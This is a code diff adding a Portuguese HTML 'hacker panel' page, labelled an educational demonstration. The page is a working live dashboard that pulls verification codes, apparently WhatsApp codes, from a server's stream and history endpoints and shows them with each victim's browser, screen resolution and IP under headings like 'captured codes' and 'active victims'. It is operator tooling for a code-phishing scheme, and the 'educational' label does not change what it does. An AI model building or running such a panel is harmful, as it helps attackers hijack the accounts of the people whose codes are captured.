@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Painel do Hacker - Demonstração</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Courier New', monospace; background: #0c0c0c; 
+            color: #00ff00; min-height: 100vh; padding: 20px; 
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { 
+            background: #1a1a1a; padding: 20px; border: 1px solid #00ff00; 
+            margin-bottom: 20px; text-align: center; 
+        }
+        .stats { 
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
+            gap: 15px; margin-bottom: 20px; 
+        }
+        .stat-card { 
+            background: #1a1a1a; padding: 15px; border: 1px solid #333; 
+            border-radius: 5px; text-align: center; 
+        }
+        .stat-number { 
+            font-size: 2em; color: #ff4444; font-weight: bold; 
+        }
+        .logs-container { 
+            background: #1a1a1a; border: 1px solid #333; padding: 20px; 
+            margin-bottom: 20px; max-height: 400px; overflow-y: auto; 
+        }
+        .log-entry { 
+            background: #2a2a2a; padding: 15px; margin: 10px 0; 
+            border-left: 4px solid #ff4444; font-family: 'Courier New', monospace; 
+        }
+        .log-code { 
+            color: #ff4444; font-weight: bold; font-size: 1.2em; 
+        }
+        .terminal { 
+            background: #000; border: 1px solid #00ff00; padding: 15px; 
+            font-family: 'Courier New', monospace; height: 200px; 
+            overflow-y: auto; margin-top: 20px; 
+        }
+        .terminal-line { margin: 5px 0; }
+        .command { color: #00ff00; }
+        .response { color: #888; }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        .alert { 
+            background: #ff4444; color: white; padding: 10px; 
+            text-align: center; margin: 10px 0; animation: pulse 2s infinite; 
+        }
+        @keyframes pulse { 
+            0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } 
+        }
+        .server-status { 
+            background: #2a2a2a; padding: 10px; margin: 10px 0; 
+            border: 1px solid #444; text-align: center; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🕵️ SISTEMA DE MONITORAMENTO - PAINEL DO HACKER</h1>
+            <p>Demonstração Educacional - Dados em Tempo Real</p>
+            <div class="server-status" id="serverStatus">
+                🔗 Conectando ao servidor...
+            </div>
+        </div>
+
+        <div class="alert" id="globalAlert">
+            ⚠️ SISTEMA ATIVO - AGUARDANDO CÓDIGOS DE VÍTIMAS...
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalCaptures">0</div>
+                <div>Códigos Capturados</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeVictims">0</div>
+                <div>Vítimas Ativas</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="successRate">100%</div>
+                <div>Taxa de Sucesso</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="lastCapture">--:--:--</div>
+                <div>Última Captura</div>
+            </div>
+        </div>
+
+        <div class="logs-container">
+            <h3>📨 LOGS DE CÓDIGOS CAPTURADOS (TEMPO REAL)</h3>
+            <div id="logsList">
+                <div class="log-entry">
+                    <div>Sistema iniciado. Conectando ao servidor...</div>
+                    <div class="response" id="systemTime">--:--:--</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="terminal">
+            <div class="terminal-line">
+                <span class="command">root@hacker-server:~# </span>
+                <span>./start_whatsapp_monitor.sh</span>
+            </div>
+            <div class="terminal-line response" id="terminalOutput">
+                [+] Iniciando sistema de captura...
+            </div>
+            <div class="terminal-line">
+                <span class="command">root@hacker-server:~# </span>
+                <span class="blink">_</span>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BASE_URL = window.location.origin;
+        let capturedCodes = [];
+        let eventSource = null;
+
+        // Conectar ao servidor para receber dados em tempo real
+        function connectToServer() {
+            try {
+                eventSource = new EventSource(`${BASE_URL}/api/stream`);
+                
+                eventSource.onopen = () => {
+                    updateServerStatus('✅ CONECTADO - AGUARDANDO VÍTIMAS...', '#28a745');
+                    addTerminalOutput('[+] Conexão estabelecida com servidor');
+                    addTerminalOutput('[+] Sistema de captura ativo');
+                    loadExistingCodes();
+                };
+
+                eventSource.onmessage = (event) => {
+                    const newData = JSON.parse(event.data);
+                    handleNewCapture(newData);
+                };
+
+                eventSource.onerror = () => {
+                    updateServerStatus('❌ ERRO DE CONEXÃO - Tentando reconectar...', '#dc3545');
+                    setTimeout(connectToServer, 3000);
+                };
+
+            } catch (error) {
+                console.error('Erro na conexão:', error);
+                updateServerStatus('❌ ERRO - Modo offline ativado', '#dc3545');
+            }
+        }
+
+        function loadExistingCodes() {
+            fetch(`${BASE_URL}/api/codes`)
+                .then(response => response.json())
+                .then(data => {
+                    capturedCodes = data.codes || [];
+                    updateDisplay();
+                    if (capturedCodes.length > 0) {
+                        addTerminalOutput(`[+] ${capturedCodes.length} códigos carregados do histórico`);
+                    }
+                })
+                .catch(error => {
+                    addTerminalOutput('[!] Erro ao carregar histórico de códigos');
+                });
+        }
+
+        function handleNewCapture(victimData) {
+            capturedCodes.push(victimData);
+            updateDisplay();
+            showNewCaptureAlert(victimData);
+            addTerminalOutput(`[+] NOVO CÓDIGO CAPTURADO: ${victimData.code}`);
+            addTerminalOutput(`[+] Vítima: ${victimData.userAgent?.split(' ')[0] || 'Navegador'} - ${victimData.screen}`);
+        }
+
+        function updateDisplay() {
+            document.getElementById('totalCaptures').textContent = capturedCodes.length;
+            document.getElementById('activeVictims').textContent = capturedCodes.length;
+            document.getElementById('lastCapture').textContent = capturedCodes.length > 0 
+                ? new Date(capturedCodes[capturedCodes.length-1].id).toLocaleTimeString('pt-BR')
+                : '--:--:--';
+
+            const logsList = document.getElementById('logsList');
+            logsList.innerHTML = '';
+
+            if (capturedCodes.length === 0) {
+                logsList.innerHTML = `
+                    <div class="log-entry">
+                        <div>Nenhum código capturado ainda...</div>
+                        <div class="response">Aguardando vítimas digitar códigos</div>
+                    </div>
+                `;
+                return;
+            }
+
+            capturedCodes.slice().reverse().forEach(log => {
+                const logEntry = document.createElement('div');
+                logEntry.className = 'log-entry';
+                logEntry.innerHTML = `
+                    <div><strong>🎯 CÓDIGO CAPTURADO</strong></div>
+                    <div>Código: <span class="log-code">${log.code}</span></div>
+                    <div>Horário: ${log.timestamp}</div>
+                    <div>Navegador: ${log.userAgent?.split(' ')[0] || 'Desconhecido'}</div>
+                    <div>Resolução: ${log.screen}</div>
+                    <div class="response">IP: ${log.ip || 'Local'} | Status: ${log.status}</div>
+                `;
+                logsList.appendChild(logEntry);
+            });
+
+            logsList.scrollTop = logsList.scrollHeight;
+        }
+
+        function showNewCaptureAlert(victimData) {
+            const alertDiv = document.getElementById('globalAlert');
+            alertDiv.innerHTML = `
+                🚨 NOVO CÓDIGO CAPTURADO! → ${victimData.code} 
+                | ${victimData.timestamp} | VÍTIMA #${capturedCodes.length}
+            `;
+            alertDiv.style.animation = 'none';
+            setTimeout(() => alertDiv.style.animation = 'pulse 2s infinite', 10);
+        }
+
+        function updateServerStatus(message, color = '#28a745') {
+            const statusDiv = document.getElementById('serverStatus');
+            statusDiv.textContent = message;
+            statusDiv.style.background = color;
+        }
+
+        function addTerminalOutput(message) {
+            const terminal = document.querySelector('.terminal');
+            const newLine = document.createElement('div');
+            newLine.className = 'terminal-line response';
+            newLine.textContent = message;
+            
+            const lastLine = terminal.querySelector('.terminal-line:last-child');
+            terminal.insertBefore(newLine, lastLine);
+            
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        // Atualizar relógio
+        function updateClock() {
+            document.getElementById('systemTime').textContent = new Date().toLocaleTimeString('pt-BR');
+        }
+
+        // Inicializar
+        document.addEventListener('DOMContentLoaded', function() {
+            connectToServer();
+            setInterval(updateClock, 1000);
+        });
+    </script>
+</body>
+</html>
